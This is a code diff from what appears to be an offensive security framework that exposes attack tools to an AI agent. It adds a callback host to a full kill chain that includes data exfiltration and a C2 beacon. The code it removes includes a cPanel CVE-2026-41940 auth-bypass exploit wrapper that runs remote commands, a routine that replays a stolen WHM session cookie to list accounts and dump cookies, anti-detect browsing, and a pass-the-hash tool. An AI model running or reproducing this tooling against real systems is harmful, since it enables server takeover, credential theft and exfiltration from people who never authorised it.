@@ -38,6 +38,14 @@ from core.runtime_config import effective_parallel_workers
 from core.tools.base import (
     run_tool,
 )
+from core.tools.dependencies import (
+    ResourceType,
+    all_of,
+    any_of,
+    python,
+    resource,
+    service,
+)
 from core.tools.recon_tools import (
     run_curl_headers,
     run_dig,
@@ -313,7 +321,11 @@ def _run_killchain_stage(stage: str, target: str) -> str:
     return "[!] Unknown stage."
 
 
-def _run_killchain_interactive(stage: str, target: str) -> str:
+def _run_killchain_interactive(
+    stage: str,
+    target: str,
+    callback_host: str = "",
+) -> str:
     """Run a kill chain stage that needs SSH credentials."""
     from core.killchain.policy import master_gate_message, stage_gate_message
 
@@ -327,6 +339,17 @@ def _run_killchain_interactive(stage: str, target: str) -> str:
     denial = master_gate_message() if stage == "full" else stage_gate_message(stage_names.get(stage, stage))
     if denial:
         return denial
+    if stage == "full":
+        if not callback_host:
+            callback_host = input("  Explicit callback host: ").strip()
+        if not callback_host:
+            return "[!] Full kill chain blocked: explicit callback_host is required."
+        try:
+            from core.execution.policy import normalize_host
+
+            callback_host = normalize_host(callback_host)
+        except ValueError:
+            return "[!] Full kill chain blocked: callback_host must be one host without URL syntax."
     try:
         from core.killchain import (
             data_exfil,
@@ -376,7 +399,11 @@ def _run_killchain_interactive(stage: str, target: str) -> str:
     if credential is None:
         return "[!] Credential registration failed."
     if stage == "full":
-        return run_full_killchain(target, credential=credential)
+        return run_full_killchain(
+            target,
+            credential=credential,
+            callback_host=callback_host,
+        )
 
     providers = {
         "privesc": run_privesc,
@@ -556,429 +583,6 @@ def run_default_recon(target: str) -> dict:
     return results
 
 
-def _verify_cpanel_in_browser(target: str, port: int, token: str, session: str) -> str:
-    """Open cPanel dashboard in ShardBrowser with stolen session cookie."""
-    try:
-        from core.osint.shardbrowser import ShardBrowser
-    except ImportError:
-        return "  [!] ShardBrowser not available — cannot verify in browser."
-
-    sb = ShardBrowser()
-    status = sb.get_status()
-    if not status.get("installed"):
-        return f"  [!] ShardBrowser not ready: {status.get('error', '')}"
-
-    # Build authenticated URL (WHM dashboard)
-    base_url = f"https://{target}:{port}"
-    dashboard_url = f"{base_url}{token}/scripts2/listaccts"
-    api_url = f"{base_url}{token}/json-api/version"
-
-    # Cookie for cPanel/WHM
-    domain = target.strip()
-    cookies = [
-        {
-            "name": "whostmgrsession",
-            "value": session,
-            "domain": domain,
-            "path": "/",
-            "httpOnly": True,
-            "secure": True,
-            "sameSite": "Lax",
-        },
-        {
-            "name": "whostmgrrelogin",
-            "value": "no",
-            "domain": domain,
-            "path": "/",
-            "secure": True,
-            "sameSite": "Lax",
-        },
-    ]
-
-    import os
-    import re
-    import time
-
-    screenshot_dir = os.path.join(
-        os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))), "data", "screenshots"
-    )
-    os.makedirs(screenshot_dir, exist_ok=True)
-    ts = int(time.time())
-    screenshot_path = os.path.join(screenshot_dir, f"cpanel_{target}_{ts}.png")
-
-    lines = []
-    lines.append("")
-    lines.append("  ╔══════════════════════════════════════════════════╗")
-    lines.append("  ║  ShardX — cPanel Session Verification            ║")
-    lines.append("  ╚══════════════════════════════════════════════════╝")
-    lines.append("")
-
-    # Step 1: Verify API access
-    print(f"  [*] Step 1: Verifying API access via {api_url[:60]}...")
-    try:
-        api_result = sb.browse_with_cookies(
-            api_url,
-            cookies,
-            headless=True,
-            wait=3,
-        )
-        api_content = api_result.get("content", "")
-        api_result.get("title", "")
-
-        # Parse version from JSON API response
-        version_match = re.search(r'"version"\s*:\s*"([^"]+)"', api_content)
-        if version_match:
-            lines.append(f"  ✅ API verified — cPanel version: {version_match.group(1)}")
-        elif api_result.get("status_code") == 200:
-            lines.append(f"  ✅ API responded (HTTP {api_result.get('status_code')})")
-        else:
-            lines.append(f"  ⚠️  API status: HTTP {api_result.get('status_code', '?')}")
-
-    except Exception as e:
-        lines.append(f"  ⚠️  API check failed: {e}")
-        api_content = ""
-
-    # Step 2: Browse WHM dashboard
-    print("  [*] Step 2: Opening WHM dashboard...")
-    try:
-        dash_result = sb.browse_with_cookies(
-            dashboard_url,
-            cookies,
-            headless=True,
-            screenshot_path=screenshot_path,
-            wait=5,
-        )
-        content = dash_result.get("content", "")
-        title = dash_result.get("title", "")
-
-        lines.append(f"  Dashboard: {dash_result.get('url_final', dashboard_url)}")
-        lines.append(f"  Title:     {title[:80] if title else '(empty)'}")
-        lines.append(f"  Size:      {len(content)} bytes")
-        lines.append(f"  HTTP:      {dash_result.get('status_code', '?')}")
-
-        if os.path.isfile(screenshot_path):
-            lines.append(f"  Screenshot: {screenshot_path}")
-
-        # Extract account list from WHM listaccts page
-        accounts = re.findall(r'<td[^>]*class="[^"]*cell[^"]*"[^>]*>\s*(\S+@\S+|\w+)\s*</td>', content)
-        if not accounts:
-            accounts = re.findall(r'acct\[\d+\]\s*=\s*\{[^}]*"user"\s*:\s*"([^"]+)"', content)
-        if not accounts:
-            accounts = re.findall(r'"user"\s*:\s*"([^"]+)"', content)
-
-        unique_accounts = list(dict.fromkeys(accounts))[:30]
-        if unique_accounts:
-            lines.append("")
-            lines.append(f"  ─── ACCOUNTS FOUND ({len(unique_accounts)}) ───")
-            for acc in unique_accounts:
-                lines.append(f"    • {acc}")
-
-        # Extract hostname
-        hostname_m = re.search(r'hostname["\s:]+([a-zA-Z0-9._-]+)', content, re.IGNORECASE)
-        if hostname_m:
-            lines.append(f"  Hostname: {hostname_m.group(1)}")
-
-        # Extract navigation links (WHM panel sections)
-        nav_links = re.findall(r'href="(/cpsess\d+/[^"]+)"[^>]*>\s*([^<]+)', content)
-        if nav_links:
-            lines.append("")
-            lines.append("  ─── WHM PANEL SECTIONS ───")
-            seen = set()
-            for href, text in nav_links[:25]:
-                text = text.strip()
-                if text and text not in seen and len(text) > 2:
-                    seen.add(text)
-                    lines.append(f"    → {text[:40]:40s}  {base_url}{href[:60]}")
-
-        # Extract cookies for persistence
-        if dash_result.get("cookies_after"):
-            lines.append("")
-            lines.append("  ─── SESSION COOKIES ───")
-            for c in dash_result["cookies_after"][:10]:
-                lines.append(f"    {c['name']:25s} = {c['value']}")
-
-        lines.append("")
-        lines.append("  ✅ BROWSER VERIFICATION COMPLETE")
-
-        # Extract text summary for AI
-        text = re.sub(r"<script[^>]*>.*?</script>", "", content, flags=re.DOTALL)
-        text = re.sub(r"<style[^>]*>.*?</style>", "", text, flags=re.DOTALL)
-        text = re.sub(r"<[^>]+>", " ", text)
-        text = re.sub(r"\s+", " ", text).strip()
-        if len(text) > 200:
-            lines.append("")
-            lines.append("  ─── PAGE TEXT (first 2000 chars) ───")
-            for i in range(0, min(len(text), 2000), 120):
-                lines.append(f"  {text[i : i + 120]}")
-
-    except Exception as e:
-        lines.append(f"  [!] Dashboard browse failed: {e}")
-
-    return "\n".join(lines)
-
-
-def _run_cpanel_exploit(target: str) -> str:
-    """Interactive cPanel CVE-2026-41940 exploit from menu."""
-    from core.plugins.base import PluginContext
-    from core.plugins.loader import PluginManager
-
-    port_str = input("  Port [2087]: ").strip() or "2087"
-    port = int(port_str)
-    mode = input("  Mode — [1] Check only  [2] Full exploit (default): ").strip() or "2"
-
-    manager = PluginManager("modules/")
-    if mode == "1":
-        checked = manager.check("cpanel_auth_bypass", target, port=port, timeout=60)
-        result = {
-            "status": "vulnerable" if checked.vulnerable else "not_vulnerable",
-            "version": checked.version,
-            "raw_output": checked.details,
-            "evidence": checked.evidence,
-        }
-    else:
-        rce_cmd = input("  RCE command [id]: ").strip() or "id"
-        plugin_result = manager.execute(
-            "cpanel_auth_bypass",
-            context=PluginContext(target=target),
-            target=f"{target}:{port}",
-            action="cmd",
-            cmd=rce_cmd,
-            allow_exploit=True,
-            timeout=60,
-        )
-        result = dict(plugin_result.data)
-        result.setdefault("status", "vulnerable" if plugin_result.success else "error")
-        if plugin_result.error:
-            result.setdefault("error", plugin_result.error)
-
-    # ── Build structured output ──
-    lines = []
-    lines.append("╔══════════════════════════════════════════════════╗")
-    lines.append("║  CVE-2026-41940 — cPanel/WHM Auth Bypass         ║")
-    lines.append("╚══════════════════════════════════════════════════╝")
-    lines.append("")
-    lines.append(f"  Target:   https://{target}:{port}")
-    lines.append(f"  Status:   {result.get('status', 'unknown').upper()}")
-
-    if result.get("token"):
-        lines.append(f"  Token:    {result['token']}")
-    if result.get("session"):
-        lines.append(f"  Session:  {result['session']}")
-    if result.get("version"):
-        lines.append(f"  Version:  {result['version']}")
-    if result.get("api_url"):
-        lines.append(f"  API URL:  {result['api_url']}")
-    if result.get("hostname"):
-        lines.append(f"  Hostname: {result['hostname']}")
-
-    lines.append(f"  Elapsed:  {result.get('elapsed_s', '?')}s")
-    lines.append(f"  Exit:     {result.get('exit_code', '?')}")
-
-    if result.get("cmd_output"):
-        lines.append("")
-        lines.append("  ─── COMMAND OUTPUT ───")
-        for ln in result["cmd_output"].splitlines():
-            lines.append(f"  {ln}")
-
-    if result.get("accounts"):
-        lines.append("")
-        lines.append(f"  ─── ACCOUNTS ({len(result['accounts'])}) ───")
-        for acc in result["accounts"][:20]:
-            lines.append(f"  {acc['user']:20s} {acc['domain']}")
-
-    if result.get("status") == "vulnerable":
-        lines.append("")
-        lines.append("  ✅ TARGET IS VULNERABLE — authenticated session obtained")
-        if result.get("token") and result.get("session"):
-            api = f"https://{target}:{port}{result['token']}/json-api/version"
-            lines.append(f"  cPanel API:  {api}")
-            lines.append(f"  Cookie:      whostmgrsession={result['session']}")
-
-        # ── Offer browser verification ──
-        if result.get("token") and result.get("session"):
-            lines.append("")
-            # Print what we have so far
-            print("\n".join(lines))
-            lines.clear()
-
-            verify = input("\n  [?] Open cPanel dashboard in ShardBrowser to verify? [Y/n]: ").strip().lower()
-            if verify != "n":
-                browser_result = _verify_cpanel_in_browser(target, port, result["token"], result["session"])
-                lines.append(browser_result)
-            else:
-                lines.append("")
-
-    raw = result.get("raw_output", "")
-    if raw:
-        lines.append("")
-        lines.append("  ─── RAW BINARY OUTPUT ───")
-        for ln in raw.splitlines()[:50]:
-            lines.append(f"  {ln}")
-
-    return "\n".join(lines)
-
-
-def _run_shardbrowser_osint(target: str) -> str:
-    """Interactive ShardBrowser — direct navigation or OSINT search."""
-    try:
-        from core.osint.shardbrowser import ShardBrowser
-    except ImportError:
-        return "[!] ShardBrowser module not found."
-
-    sb = ShardBrowser()
-    status = sb.get_status()
-    if not status.get("installed"):
-        return (
-            f"[!] ShardBrowser not ready: {status.get('error', 'unknown')}\n"
-            "Install deps: pip install httpx[socks] patchright"
-        )
-
-    import re as _re
-
-    # Detect if target is IP/URL (navigate directly) vs search query (OSINT search)
-    is_ip_or_url = bool(
-        _re.match(
-            r"^(\d{1,3}\.){3}\d{1,3}(:\d+)?$|^https?://|^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(:\d+)?(/.*)?$", target.strip()
-        )
-    )
-
-    if is_ip_or_url:
-        # Default: direct navigation mode
-        print("  [*] Target is IP/URL — using direct navigation (not search)")
-        mode = input("  Mode — [1] Direct browse (default)  [2] OSINT search: ").strip() or "1"
-    else:
-        mode = "2"
-
-    if mode == "1":
-        # ── Direct navigation: open target in anti-detect browser ──
-        proto = input("  Protocol [https]: ").strip() or "https"
-        port_in = input("  Port [auto]: ").strip()
-
-        # Build URL
-        t = target.strip()
-        url = (f"{proto}://{t}:{port_in}" if port_in else f"{proto}://{t}") if not t.startswith("http") else t
-
-        print(f"  [*] Navigating to: {url}")
-
-        session = None
-        try:
-            session = sb.launch_profile(
-                platform="Windows",
-                headless=True,
-                randomize=True,
-            )
-
-            import asyncio
-
-            try:
-                loop = asyncio.get_running_loop()
-            except RuntimeError:
-                loop = None
-
-            if loop and loop.is_running():
-                # Already in async context — use new loop in thread
-                import concurrent.futures
-
-                with concurrent.futures.ThreadPoolExecutor() as pool:
-                    content = pool.submit(asyncio.run, sb._browse_async(session.cdp_url, url, wait=5)).result(
-                        timeout=30
-                    )
-            else:
-                content = asyncio.run(sb._browse_async(session.cdp_url, url, wait=5))
-
-            # Extract useful info from page
-            lines = []
-            lines.append("╔══════════════════════════════════════════════════╗")
-            lines.append(f"║  ShardX Direct Browse — {url[:40]:<40s} ║")
-            lines.append("╚══════════════════════════════════════════════════╝")
-            lines.append("")
-            lines.append(f"  URL:            {url}")
-            lines.append(f"  Content size:   {len(content)} bytes")
-
-            # Extract title
-            import re
-
-            title_m = re.search(r"<title[^>]*>(.*?)</title>", content, re.DOTALL | re.IGNORECASE)
-            if title_m:
-                lines.append(f"  Page title:     {title_m.group(1).strip()[:100]}")
-
-            # Extract headers from meta tags
-            metas = re.findall(
-                r'<meta\s+[^>]*name=["\']([^"\']+)["\'][^>]*content=["\']([^"\']+)["\']', content, re.IGNORECASE
-            )
-            if metas:
-                lines.append("  Meta tags:")
-                for name, val in metas[:10]:
-                    lines.append(f"    {name}: {val[:80]}")
-
-            # Extract links
-            hrefs = re.findall(r'href=["\']([^"\']+)["\']', content)
-            unique_hrefs = list(dict.fromkeys(hrefs))[:20]
-            if unique_hrefs:
-                lines.append(f"  Links ({len(hrefs)} total, showing {len(unique_hrefs)}):")
-                for h in unique_hrefs:
-                    lines.append(f"    → {h[:120]}")
-
-            # Extract forms (login forms, etc.)
-            forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', content, re.IGNORECASE)
-            if forms:
-                lines.append("  Forms:")
-                for f in forms[:5]:
-                    lines.append(f"    POST → {f}")
-
-            # Extract input fields (credential fields)
-            inputs = re.findall(
-                r'<input[^>]*type=["\']?(password|text|email)["\']?[^>]*name=["\']([^"\']+)["\']',
-                content,
-                re.IGNORECASE,
-            )
-            if inputs:
-                lines.append("  Input fields:")
-                for itype, iname in inputs[:10]:
-                    lines.append(f"    [{itype}] {iname}")
-
-            # Server headers from content clues
-            server_m = re.search(r"[Ss]erver:\s*([^\r\n]+)", content)
-            poweredby = re.search(r"[Xx]-[Pp]owered-[Bb]y:\s*([^\r\n]+)", content)
-            if server_m:
-                lines.append(f"  Server:         {server_m.group(1)}")
-            if poweredby:
-                lines.append(f"  X-Powered-By:   {poweredby.group(1)}")
-
-            lines.append("")
-            lines.append("  ─── PAGE CONTENT (first 3000 chars) ───")
-            # Strip HTML tags for readable text
-            text = re.sub(r"<script[^>]*>.*?</script>", "", content, flags=re.DOTALL)
-            text = re.sub(r"<style[^>]*>.*?</style>", "", text, flags=re.DOTALL)
-            text = re.sub(r"<[^>]+>", " ", text)
-            text = re.sub(r"\s+", " ", text).strip()
-            for i in range(0, min(len(text), 3000), 120):
-                lines.append(f"  {text[i : i + 120]}")
-
-            return "\n".join(lines)
-
-        except Exception as e:
-            return f"[!] ShardX browse failed: {e}"
-        finally:
-            if session:
-                try:
-                    session.stop()
-                except Exception as _exc:
-                    logging.debug(f"Suppressed in post_tools.py: {_exc}")
-    else:
-        # ── OSINT search mode ──
-        query = input(f"  Search query [{target}]: ").strip() or target
-        engines_str = input("  Engines [google,bing,duckduckgo]: ").strip()
-        engines = [e.strip() for e in engines_str.split(",")] if engines_str else None
-        results = sb.osint_target(query, engines=engines)
-        import json as _json
-
-        return f"[ShardX OSINT Search — {query}]\n" + _json.dumps(results, indent=2, default=str)
-
-
-# ── AI FACING WRAPPERS FOR REGISTRY ─────────────────────
-
-
 def _resolve_credential_ref(
     host: str,
     user: str | None = None,
@@ -1144,6 +748,7 @@ def _ad_creds_for_execution(
             yield provider_creds, ""
         finally:
             provider_creds["password"] = ""
+            provider_creds["nthash"] = ""
 
 
 def _call_ad_provider(creds: dict | None, provider) -> str:
@@ -1337,96 +942,6 @@ def _build_browser_url(target: str, proto: str = "https", port: str = "") -> str
     if port:
         return f"{proto}://{target}:{port}"
     return f"{proto}://{target}"
-
-
-def _summarize_browser_content(url: str, content: str) -> str:
-    """Extract compact web intelligence from browser-rendered HTML."""
-    lines = [
-        f"[ShardX Direct Browse - {url}]",
-        f"URL: {url}",
-        f"Content size: {len(content or '')} bytes",
-    ]
-
-    title_m = re.search(r"<title[^>]*>(.*?)</title>", content or "", re.DOTALL | re.IGNORECASE)
-    if title_m:
-        title = re.sub(r"\s+", " ", title_m.group(1)).strip()
-        lines.append(f"Page title: {title[:160]}")
-
-    metas = re.findall(
-        r'<meta\s+[^>]*name=["\']([^"\']+)["\'][^>]*content=["\']([^"\']+)["\']',
-        content or "",
-        re.IGNORECASE,
-    )
-    if metas:
-        lines.append("Meta tags:")
-        for name, val in metas[:12]:
-            clean_val = re.sub(r"\s+", " ", val).strip()
-            lines.append(f"  {name}: {clean_val[:140]}")
-
-    hrefs = re.findall(r'href=["\']([^"\']+)["\']', content or "", re.IGNORECASE)
-    unique_hrefs = list(dict.fromkeys(hrefs))
-    if unique_hrefs:
-        lines.append(f"Links: {len(hrefs)} total, {len(unique_hrefs)} unique")
-        for href in unique_hrefs[:25]:
-            lines.append(f"  link: {href[:180]}")
-
-    forms = re.findall(r'<form[^>]*?(?:action=["\']([^"\']*)["\'])?[^>]*>', content or "", re.IGNORECASE)
-    if forms:
-        lines.append(f"Forms: {len(forms)}")
-        for action in forms[:10]:
-            lines.append(f"  form_action: {action or '(current page)'}")
-
-    inputs = re.findall(
-        r'<input[^>]*type=["\']?([^"\'\s>]+)["\']?[^>]*name=["\']([^"\']+)["\']',
-        content or "",
-        re.IGNORECASE,
-    )
-    if inputs:
-        lines.append(f"Input fields: {len(inputs)}")
-        for itype, iname in inputs[:20]:
-            lines.append(f"  input: {itype}:{iname}")
-
-    text = re.sub(r"<script[^>]*>.*?</script>", "", content or "", flags=re.DOTALL | re.IGNORECASE)
-    text = re.sub(r"<style[^>]*>.*?</style>", "", text, flags=re.DOTALL | re.IGNORECASE)
-    text = re.sub(r"<[^>]+>", " ", text)
-    text = re.sub(r"\s+", " ", text).strip()
-    if text:
-        lines.append("Visible text:")
-        lines.append(text[:2000])
-
-    return "\n".join(lines)
-
-
-def _run_shardbrowser_direct(
-    target: str, proto: str = "https", port: str = "", wait: float = 5, headless: bool = True
-) -> str:
-    try:
-        from core.osint.shardbrowser import ShardBrowser
-    except ImportError:
-        return "[!] ShardBrowser module not found."
-
-    sb = ShardBrowser()
-    status = sb.get_status()
-    if not status.get("installed"):
-        return (
-            f"[!] ShardBrowser not ready: {status.get('error', 'unknown')}\n"
-            "Install deps: pip install httpx[socks] patchright"
-        )
-
-    url = _build_browser_url(target, proto=proto, port=port)
-    session = None
-    try:
-        session = sb.launch_profile(platform="Windows", headless=headless, randomize=True)
-        content = sb.browse_sync(session, url, wait=float(wait))
-        return _summarize_browser_content(url, content)
-    except Exception as e:
-        return f"[!] ShardX browse failed: {e}"
-    finally:
-        if session:
-            try:
-                session.stop()
-            except Exception as _exc:
-                logging.debug(f"Suppressed in post_tools.py: {_exc}")
 
 
 def _target_in_authorized_scope(target: str, scopes: list) -> bool:
@@ -1664,6 +1179,7 @@ def _run_full_killchain_credential_provider(
     provider,
     *,
     missing_message: str,
+    provider_kwargs: dict | None = None,
 ) -> str:
     """Pass an opaque credential reference through to the full orchestrator."""
 
@@ -1684,7 +1200,11 @@ def _run_full_killchain_credential_provider(
             return error
         return missing_message
     try:
-        result = provider(target, credential=credential)
+        result = provider(
+            target,
+            credential=credential,
+            **dict(provider_kwargs or {}),
+        )
     except Exception as exc:
         message = sanitize_credential_result(credential, exc)
         return f"[!] Credential provider failed ({type(exc).__name__}): {message}"
@@ -1812,7 +1332,12 @@ def ai_exfil(target_ip: str, user: str | None = None, pwd: str | None = None) ->
     description="Run Full Killchain",
     requires=["python:paramiko"],
 )
-def ai_full_killchain(target_ip: str, user: str | None = None, pwd: str | None = None) -> str:
+def ai_full_killchain(
+    target_ip: str,
+    user: str | None = None,
+    pwd: str | None = None,
+    callback_host: str = "",
+) -> str:
     from core.killchain import run_full_killchain
 
     return _run_full_killchain_credential_provider(
@@ -1821,6 +1346,7 @@ def ai_full_killchain(target_ip: str, user: str | None = None, pwd: str | None =
         pwd,
         run_full_killchain,
         missing_message=f"[!] Full killchain requires valid SSH credentials for {target_ip}.",
+        provider_kwargs={"callback_host": callback_host},
     )
 
 
@@ -1871,51 +1397,18 @@ def ai_deploy_c2_beacon(
 
 
 @tool(
-    name="cpanel_exploit",
-    aliases=["cve_2026_41940", "cpanel_auth_bypass"],
-    category="post",
-    description="CVE-2026-41940 cPanel Exploit",
-)
-def ai_cpanel_exploit(target: str, action: str = "cmd", cmd_arg: str = "id") -> str:
-    normalized_action = str(action or "cmd").strip().casefold()
-    if normalized_action not in {"check", "cmd", "scan"}:
-        return "[!] cPanel exploit blocked: unsupported action."
-    if normalized_action == "cmd" and not remote_command_is_code_owned("cpanel_exploit", cmd_arg):
-        return "[!] cPanel exploit blocked: command is outside the code-owned operation allowlist."
-    try:
-        import json as _json
-
-        from core.plugins.base import PluginContext
-        from core.plugins.loader import PluginManager
-
-        plugin_result = PluginManager("modules/").execute(
-            "cpanel_auth_bypass",
-            context=PluginContext(target=target),
-            target=target,
-            action=normalized_action,
-            cmd=cmd_arg,
-            allow_exploit=normalized_action not in {"scan", "check"},
-            timeout=60,
-        )
-        payload = {
-            "success": plugin_result.success,
-            "data": plugin_result.data,
-            "sessions": plugin_result.sessions,
-            "error": plugin_result.error,
-        }
-        out = f"[CVE-2026-41940 — {target}]\n" + _json.dumps(payload, indent=2, default=str)
-        if plugin_result.output:
-            out += f"\n\n─── PLUGIN OUTPUT ───\n{plugin_result.output}"
-        return out
-    except Exception as e:
-        return f"[!] cPanel exploit error: {e}"
-
-
-@tool(
     name="shodan",
     aliases=["shodan_search", "shodan_host", "shodan_vulns", "shodan_range"],
     category="recon",
     description="Shodan OSINT tool",
+    dependencies=all_of(
+        python("shodan"),
+        service(
+            "shodan",
+            secret_name="SHODAN_API_KEY",
+            environment=("SHODAN_API_KEY",),
+        ),
+    ),
 )
 def ai_shodan_smart(query: str) -> str:
     try:
@@ -1928,9 +1421,13 @@ def ai_shodan_smart(query: str) -> str:
 
 @tool(
     name="browser_surface_analysis",
-    aliases=["browser_analyze", "browser_surface", "shardbrowser_browse"],
+    aliases=["browser_analyze", "browser_surface"],
     category="recon",
-    description="Render and summarize a target page with ShardBrowser, with HTTP fallback.",
+    description="Fetch and summarize a target page with the scoped web backend.",
+    dependencies=all_of(
+        python("requests"),
+        python("bs4", distribution="beautifulsoup4"),
+    ),
 )
 def ai_browser_surface_analysis(target: str, proto: str = "https", port: str = "", wait: float = 5) -> str:
     try:
@@ -1945,49 +1442,13 @@ def ai_browser_surface_analysis(target: str, proto: str = "https", port: str = "
     )
     if not decision.allowed:
         return f"[!] Browser surface analysis blocked: {decision.reason}"
-    rendered = _run_shardbrowser_direct(url, proto=proto, port=port, wait=wait, headless=True)
-    if not str(rendered).startswith("[!]"):
-        return rendered
-
-    fallback = run_scrapling_fetch(url)
+    result = run_scrapling_fetch(url)
     return (
-        f"[Browser Surface Fallback - {url}]\n"
+        f"[Browser Surface Analysis - {url}]\n"
         f"URL: {url}\n"
-        f"ShardBrowser status: {rendered}\n"
-        f"Fallback: scrapling/requests\n\n"
-        f"{fallback}"
+        f"Backend: scrapling/requests\n\n"
+        f"{result}"
     )
-
-
-@tool(
-    name="shardbrowser_osint",
-    aliases=["browser_osint", "shard_osint", "shardbrowser"],
-    category="recon",
-    description="Run isolated ShardBrowser OSINT searches.",
-    requires=["octopus:shardbrowser"],
-)
-def ai_shardbrowser_osint(query: str, engines: str = "", proxy: str = "") -> str:
-    try:
-        import json as _json
-
-        from core.osint.shardbrowser import ShardBrowser
-    except ImportError:
-        return "[!] ShardBrowser module not found."
-
-    sb = ShardBrowser()
-    status = sb.get_status()
-    if not status.get("installed"):
-        return (
-            f"[!] ShardBrowser not ready: {status.get('error', 'unknown')}\n"
-            "Install deps: pip install httpx[socks] patchright"
-        )
-
-    engine_list = [e.strip() for e in engines.split(",") if e.strip()] if engines else None
-    try:
-        results = sb.osint_target(query, engines=engine_list, proxy=proxy or None, headless=True)
-        return f"[ShardX OSINT Search - {query}]\n" + _json.dumps(results, indent=2, default=str)
-    except Exception as e:
-        return f"[!] ShardX OSINT failed: {e}"
 
 
 @tool(
@@ -2171,6 +1632,12 @@ def _mysql_inventory(host: str, port: int, user: str, password: str) -> dict:
     aliases=["database_inventory"],
     category="post",
     description="Read-only database inventory using known credentials.",
+    dependencies=any_of(
+        python("psycopg2", distribution="psycopg2-binary"),
+        python("psycopg"),
+        python("pymysql", distribution="PyMySQL"),
+        python("mysql.connector", distribution="mysql-connector-python"),
+    ),
 )
 def ai_db_inventory(host: str, port: int = 0, service: str = "") -> str:
     """Inventory a DB only with already known credentials. No credential guessing."""
@@ -2490,21 +1957,6 @@ def ai_dcsync(target_ip: str, user: str | None = None, pwd: str | None = None, d
 
 
 @tool(
-    name="pass_the_hash",
-    aliases=["pth"],
-    category="post",
-    description="Pass-the-Hash authentication",
-    requires=["any:python:impacket.smbconnection,smbexec.py,impacket-smbexec,wmiexec.py,impacket-wmiexec"],
-)
-def ai_pass_the_hash(target_ip: str, user: str = "", nthash: str = "", domain: str = "") -> str:
-    if not user or not nthash:
-        return "[!] Pass-the-Hash requires target, user and NT hash."
-    from core.killchain.ad.credential import pass_the_hash
-
-    return pass_the_hash(target_ip, user, nthash, domain=domain or "")
-
-
-@tool(
     name="psexec",
     aliases=["ps_exec"],
     category="post",
@@ -2786,6 +2238,7 @@ def ai_searchsploit(query: str) -> str:
     aliases=["run_plugin", "octopus_plugin"],
     category="util",
     description="Run a class-based OCTOPUS plugin by name.",
+    dependencies=resource("", "modules", resource_type=ResourceType.DIRECTORY),
 )
 def ai_run_plugin(plugin_name: str, target: str = "", action: str = "scan") -> str:
     """Execute PluginManager plugins through the tool registry.
